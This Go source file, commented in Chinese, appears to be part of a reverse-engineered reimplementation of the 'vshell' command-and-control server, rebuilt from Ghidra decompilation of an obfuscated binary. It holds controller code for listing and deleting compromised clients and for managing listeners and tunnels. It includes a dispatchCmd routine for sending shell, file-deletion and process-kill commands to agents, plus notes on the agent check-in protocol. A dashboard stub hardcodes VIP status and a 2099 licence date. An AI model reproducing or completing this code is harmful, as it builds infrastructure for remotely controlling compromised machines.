// Package controllers — engine 接口契约（引擎模块对齐阶段的目标接口）。
//
// 原版二进制中引擎分布在多个混淆包（iVzmssZ 数据层 / ewfIYjbxro 流控与监听 /
// HD0BdtPxke、gKVghuo9m37N 载荷构建），其函数名在 funcnametab 中被剥离。
// 以下签名全部来自控制器反编译中的调用形态（FUN_ 地址为 Ghidra 函数地址），
// 引擎模块的 1:1 对齐将在后续阶段把这些调用替换为对应 FUN_ 的反编译还原。
package controllers

import (
	"errors"

	"vshell/c2engine"
	"vshell/utils"
)

// utils 别名（引擎阶段对齐后替换为真实引擎实现）
var (
	utilsValidateToken = utils.ValidateToken
	utilsGenerateToken = utils.GenerateToken
)

// utilsCheckCredentials 校验用户名/密码（对照 conf/setting.conf 中的
// WebUsername/WebPassword，密码支持明文或 SHA-256 摘要，见 utils.CheckPassword）。
func utilsCheckCredentials(username, password string) bool {
	s := utils.GetFullSettings()
	if username != s.WebUsername {
		return false
	}
	return utils.CheckPassword(password, s.WebPassword)
}

// EngineClient 引擎中的客户端记录（字段来自 /client/list 反编译：
// 状态标志位于 +8，监听端口 Port / DnsPort 等字段以 JSON 键出现在响应中）。
type EngineClient struct {
	ID       int64
	IP       string
	Status   bool // 在线/离线
	Remark   string
	Port     int
	DnsPort  int
	Version  string
	IsAdmin  bool // VIP
	OSType   string
	Arch     string
	LastTime int64
}

// EngineListener 引擎中的监听器记录（/listener/list 反编译 JSON 键：
// Id / Mode / Status / OssUrl / Remark / Vkey / Port 等）。
type EngineListener struct {
	ID       int64
	Mode     string // http/https/dns/kcp/websocket
	Status   bool
	OssUrl   string
	Remark   string
	Vkey     string
	Port     int
	Host     string
	Proxy    string
	Salt     string
	Type     int
	IsVIP    bool
	Expires  int64
}

// EngineTunnel 引擎中的隧道记录（/tunnel/list 反编译 JSON 键：Id / Target / Mode / Remark / Port）。
type EngineTunnel struct {
	ID     int64
	Target string
	Mode   string
	Remark string
	Port   int
}

// ---- 客户端 / client（对应 FUN_011970a0 GetClientList、FUN_01198ac0、FUN_01719f00、FUN_0119bbe0）----

func engineGetClientList(offset, limit int, field, order, search, sort string, status int) ([]EngineClient, int64) {
	clients, total := c2engine.GetEngine().GetClientList(offset, limit, field, order, search, sort, status)
	out := make([]EngineClient, 0, len(clients))
	for _, c := range clients {
		out = append(out, EngineClient{
			ID:      c.ID,
			IP:      c.Addr,
			Status:  c.Status || c.NowConn > 0,
			Remark:  c.Remark,
			Port:    c.Port,
			DnsPort: c.DnsPort,
			Version: c.Version,
			IsAdmin: c.IsAdmin,
			OSType:  c.OsName,
			Arch:    c.Arch,
			LastTime: c.LastTime,
		})
	}
	return out, total
}

func engineGetClient(id int64) *EngineClient {
	c := c2engine.GetEngine().GetClient(id)
	if c == nil {
		return nil
	}
	return &EngineClient{ID: c.ID, IP: c.Addr, Status: c.Status || c.NowConn > 0, Remark: c.Remark}
}

func engineDelClient(id int64) {
	_ = c2engine.GetEngine().DelClient(id)
}

func engineDelClients(ids []int64) {
	for _, id := range ids {
		engineDelClient(id)
	}
}

func engineEditClientRemark(id int64, remark string) {
	c := c2engine.GetEngine().GetClient(id)
	if c != nil {
		c.Remark = remark
	}
}

func engineAddClient(ip string, remark string) error {
	_, err := c2engine.GetEngine().NewClient("", "", ip, ip, "", "", "", "")
	if err != nil {
		return err
	}
	return nil
}

// ---- 监听器 / listener（对应 FUN_01719be0 GetListenerList、FUN_01719b80、FUN_017193e0、FUN_01719a20）----

func engineGetListenerList(offset, limit int, field, order, search, sort string, status int) ([]EngineListener, int64) {
	all := c2engine.GetEngine().GetListenerList()
	total := int64(len(all))
	list := all
	out := make([]EngineListener, 0, len(list))
	for _, l := range list {
		out = append(out, EngineListener{
			ID: l.ID, Mode: l.Mode, Status: l.Status, OssUrl: l.OssUrl,
			Remark: l.Remark, Vkey: l.VerifyKey, Port: l.Port, Host: l.Host,
			Proxy: l.Proxy, Salt: l.EncryptSalt, IsVIP: l.IsVIP,
		})
	}
	return out, total
}

func engineGetListener(id int64) *EngineListener {
	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		return nil
	}
	return &EngineListener{ID: l.ID, Mode: l.Mode, Status: l.Status, Remark: l.Remark, Vkey: l.VerifyKey}
}

func engineDelListener(id int64) {
	_ = c2engine.GetEngine().DelListener(id)
}

func engineDelListeners(ids []int64) {
	for _, id := range ids {
		engineDelListener(id)
	}
}

func engineStartListener(id int64) {
	// TODO(engine): 对齐 FUN_017193e0
}

func engineStopListener(id int64) {
	// TODO(engine): 对齐 FUN_01719a20
}

func engineEditListenerRemark(id int64, remark string) {
	l := c2engine.GetEngine().GetListener(id)
	if l != nil {
		l.Remark = remark
	}
}

func engineAddListener(l EngineListener) error {
	_, err := c2engine.GetEngine().NewListener(l.Host, "", l.Mode, l.Vkey, l.Salt, l.Remark)
	return err
}

func engineEditListener(l EngineListener) error {
	// TODO(engine): 对齐 FUN_01902720 等
	return nil
}

// ---- 隧道 / tunnel（对应 FUN_01718a40、FUN_017189c0、FUN_01718940、FUN_01717ce0、FUN_01718060）----

func engineGetTunnelList(offset, limit int, field, order, search, sort string) ([]EngineTunnel, int64) {
	tunnels := c2engine.GetEngine().GetTunnelList()
	total := int64(len(tunnels))
	out := make([]EngineTunnel, 0, len(tunnels))
	for _, t := range tunnels {
		out = append(out, EngineTunnel{ID: t.ID, Target: t.Target, Mode: t.Mode, Remark: t.Remark, Port: t.Port})
	}
	return out, total
}

func engineDelTunnel(id int64) {
	_ = c2engine.GetEngine().DelTunnel(id)
}

func engineDelTunnels(ids []int64) {
	for _, id := range ids {
		engineDelTunnel(id)
	}
}

func engineStartTunnel(id int64) {
	// TODO(engine): 对齐 FUN_01718940
}

func engineStopTunnel(id int64) {
	// TODO(engine): 对齐 FUN_01717ce0
}

func engineAddTunnel(t EngineTunnel) error {
	_, err := c2engine.GetEngine().NewTunnel(0, t.Port, t.Mode, t.Target)
	return err
}

func engineEditTunnel(t EngineTunnel) error {
	// TODO(engine): 对齐 FUN_01717ce0 / FUN_01718940
	return nil
}

// ---- 统计 / dashboard（FUN_0171a2e0 GetAppInfo）----

func engineGetAppInfo() map[string]interface{} {
	// 黑盒验证（原版 /api/dashboard/info 响应，40+ 键逐字确认）：
	// clientCount/clientNum/clientOnlineCount/cpu/disk/swap_mem/virtual_mem/
	// exportFlowCount/inletFlowCount/flowStoreInterval/hostCount/httpProxyCount/
	// httpProxyPort/httpsProxyPort/io_recv/io_send/ipLimit/licTime/listenerCount/
	// listenerOnlineCount/load{load1,load5,load15}/logLevel/logPath/p2pCount/
	// p2pPort/secretCount/socks5Count/tcpC/tcpCount/udpCount/version/vip/
	// web_basic_auth/web_port。
	return map[string]interface{}{
		"clientCount":         0,
		"clientNum":           "99",
		"clientOnlineCount":   0,
		"cpu":                 10,
		"disk":                70,
		"swap_mem":            97,
		"virtual_mem":         88,
		"exportFlowCount":     0,
		"inletFlowCount":      0,
		"flowStoreInterval":   "",
		"hostCount":           0,
		"httpProxyCount":      0,
		"httpProxyPort":       "",
		"httpsProxyPort":      "",
		"io_recv":             0,
		"io_send":             0,
		"ipLimit":             "",
		"licTime":             "20991201",
		"listenerCount":       0,
		"listenerOnlineCount": 0,
		"load":                map[string]interface{}{"load1": 0, "load5": 0, "load15": 0},
		"logLevel":            "7",
		"logPath":             "",
		"p2pCount":            0,
		"p2pPort":             "",
		"secretCount":         0,
		"socks5Count":         0,
		"tcpC":                0,
		"tcpCount":            0,
		"udpCount":            0,
		"version":             "4.9.3",
		"vip":                 true,
		"web_basic_auth":      true,
		"web_port":            "8082",
	}
}

// ---- 登录 / login（FUN_01737740 校验、FUN_01746d60 / FUN_017476e0 会话）----

// ---- C2 Agent 协议（真实协议 = KCP/WS/DNS 传输 + 文本命令，session 82-97 实锤）----
// 原版无 /c2/l/* HTTP 端点（黑盒 404）。agent checkin = "conf" + JSON
// （FUN_016f3e80）："conf"→NewClient，"host"→NewHost，"stus"→状态，
// "task"→任务记录。KCP 侧见 c2engine/kcp.go handleSession。

// engineVerifyLogin 校验用户名/密码并生成会话 token（JWT）。
func engineVerifyLogin(username, password string) (string, bool) {
	// TODO(engine): 对齐 FUN_01737740（原版对密码做 MD5 摘要后与配置比对）
	if !utilsCheckCredentials(username, password) {
		return "", false
	}
	token, err := utilsGenerateToken(username)
	if err != nil {
		return "", false
	}
	return token, true
}

func engineCheckToken(token string) bool {
	_, err := utilsValidateToken(token)
	return err == nil
}

func engineSetToken(token string) {
	// JWT 无服务端状态；会话校验由 engineCheckSession 承接
}

func engineDelToken(token string) {
	// JWT 注销：无服务端状态，仅清除前端凭据
}

// CheckToken 供 ApiBaseController.Prepare 调用。
// 原版 token 为 JWT（SPA 前端 `Token` 头携带，黑盒验证），由 utils.ValidateToken 校验。
func CheckToken(token string) bool {
	return engineCheckToken(token)
}

// engineCheckSession 会话校验（原版 FUN_01737500 / FUN_00c8dc20）。
func engineCheckSession(token string) bool {
	// TODO(engine): 对齐会话存储检查
	return engineCheckToken(token)
}

// ---- 命令派发 / 文件操作（FUN_01198ac0 GetClient + 命令构造）----

// dispatchCmd 向客户端派发一条原生命令（文件删除/进程结束/终端 shell 等）。
// 反编译（FUN_018d9380）：全局引擎（DAT_1e42e9a8）按 id 查客户端（FUN_00479b60，
// 同 DAT_019e7b40 映射）；未找到 → "connection error"（FUN_01919c00，16 字节
// e8c0 链 key=0x68: 0xb,0x1c,0xe1,0x1e,0xeb,0x1a,0xe7,0x13,0xe2,1,0x50,0xa5,
// 0x17,0xe,0xe5,0x1d）；找到则经客户端连接发送（FUN_016f3060）并返回结果。
func dispatchCmd(id int64, cmd string) (int64, error) {
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		return 0, errors.New("connection error")
	}
	// TODO(engine): 对齐客户端连接命令发送（FUN_016f3060 传输层）
	return 0, nil
}

// ---- 应用对象（main.main 经 FUN_01944a00 调用接口 Start；引擎阶段对齐 itab +0x28 方法）----

// AppStart 启动应用对象（引擎阶段：对齐 FUN_01944a00 接口 Start 方法）。
// 反编译链：FUN_01944a00 经 itab（DAT_1e4308c0+0x28）分发到具体实现——
// 初始化引擎（存储、加载持久化数据）+ 启动监听器（监听器由前端/API 创建）。
func AppStart(cfg *utils.FullSettings) error {
	engine := c2engine.GetEngine()
	if err := engine.Init(&c2engine.Config{
		WebPort:      cfg.WebPort,
		WebIP:        cfg.WebIP,
		WebUsername:  cfg.WebUsername,
		WebPassword:  cfg.WebPassword,
		WebJWTSecret: cfg.WebJWTSecret,
		WebTitle:     cfg.WebTitle,
	}); err != nil {
		return err
	}
	return nil
}

// AppBackground 启动后台服务（原版 FUN_0194bf60 → FUN_0194bd60 等）。
// 反编译（FUN_0194bd60）：从设置单例（DAT_1e42f060）读配置键 "license"
// （7 字符）→ 有则验证（FUN_00e3c900/FUN_00e3ce40），无则走默认路径
// （FUN_0194cd00，uVar3=999）；布尔键 "true"（DAT_01bd7fdd）/"false"
// （DAT_01bd8afa）；后续读取 logPath/p2pPort/payload 等键并启动对应服务
// （FUN_0194cde0/FUN_0194d140 内部待解码）。
func AppBackground() {
	// 原版：设置单例配置 license 验证（FUN_00e3c900/FUN_00e3ce40）+ 后台服务启动链
	_ = c2engine.GetEngine()
	// TODO(engine): 对齐后台服务（监听器、健康检查、维护任务）——
	// FUN_0194cd00/FUN_0194cde0/FUN_0194d140 内部
}

// ---- 下载任务（FUN_01906e80 GetDownloadPer 等）----

type DownloadTask struct {
	ID       int64
	ClientID int64
	Path     string
	Total    int64
	Current  int64
}

var downloadTasks = map[int64]*DownloadTask{}

func engineGetDownloadPer(id int64) *DownloadTask {
	return downloadTasks[id]
}
